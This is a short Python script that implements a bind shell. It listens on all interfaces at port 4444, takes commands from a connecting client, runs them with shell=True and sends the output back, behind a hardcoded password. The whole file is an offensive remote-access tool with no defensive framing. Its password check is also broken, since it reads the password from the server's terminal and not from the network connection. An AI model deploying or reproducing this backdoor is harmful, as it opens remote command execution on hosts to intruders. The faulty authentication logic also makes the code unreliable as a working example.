
import os
import socket
import subprocess
from getpass import getpass

def bind_shell(ip, port, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(f"[+] Listening on {ip}:{port}")

    while True:
        conn, addr = s.accept()
        print(f"[+] Connection from {addr}")

        # Prompt for password
        conn.send("Enter password: ".encode())
        entered_password = getpass().strip()  # Use getpass to hide the input

        if entered_password != password:
            conn.send("[!] Incorrect password. Connection closed.\n".encode())
            conn.close()
            continue

        while True:
            command = conn.recv(1024).decode().strip()
            if not command:
                break
            if command.lower() == 'exit':
                print("[!] Connection closed.")
                break

            # Execute multiple commands separated by a semicolon
            commands = command.split(';')
            output = ""
            for cmd in commands:
                if cmd.lower().startswith('cd '):
                    # Change the current working directory
                    try:
                        os.chdir(cmd[3:])
                        output += f"[*] Changed directory to: {os.getcwd()}\n"
                    except FileNotFoundError:
                        output += f"[!] Directory not found: {cmd[3:]}\n"
                else:
                    proc = subprocess.run(cmd, shell=True, capture_output=True)
                    output += proc.stdout.decode() + proc.stderr.decode()

            if not output:
                output = "[*] No output.\n"

            conn.send(output.encode())

        conn.close()

if __name__ == "__main__":
    bind_shell("0.0.0.0", 4444, "asdf123")
